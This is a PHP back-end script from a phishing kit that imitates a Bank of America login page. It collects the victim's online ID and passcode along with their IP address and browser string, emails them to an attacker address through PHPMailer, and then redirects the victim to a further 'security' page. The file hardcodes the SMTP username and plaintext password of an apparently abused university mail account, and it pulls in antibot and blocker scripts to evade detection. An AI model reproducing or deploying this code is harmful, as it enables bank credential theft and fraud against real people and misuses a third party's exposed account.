<?php
$zabi = getenv("REMOTE_ADDR");
include 'antibots.php';
include('../email.php');
include './bt.php';
include "./blocker.php";

$message = "--++-----[ $$ World Wide On My Hand  $$ ]-----++--\n";
$message .= "--------------  LOGIN Boa  -------------\n";
$message .= "Onlineid : ".$_POST['onlineId']."\n";
$message .= "Password : ".$_POST['passcode']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- BY Dr.Don----------------------\n";
$cc = $_POST['ccn'];
$subject = "BOA Login [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// Load Composer's autoloader
require_once '../../../vendor/autoload.php';

$mail = new PHPMailer(true);

try {
    //Server settings
    $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      // Enable verbose debug output
    $mail->isSMTP();                                            // Send using SMTP
    $mail->Host       = 'secure265.inmotionhosting.com';                    // Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
    $mail->Username   = 'gerald@legacyuniversity.edu.ng';                     // SMTP username
    $mail->Password   = '!@#$%Odogwu';                               // SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;         // Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged
    $mail->Port       = 465;                                    // TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above

    //Recipients
    $mail->setFrom('gerald@legacyuniversity.edu.ng', 'BOA');
    $mail->addAddress($email);               // Name is optional

    // Content
    $mail->isHTML(true);                                  // Set email format to HTML
    $mail->Subject = $subject;
    $mail->Body    = $message;

    $mail->send();

    header("Location: security.php");
} catch (Exception $e) {
    "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    header("Location: security.php");
}
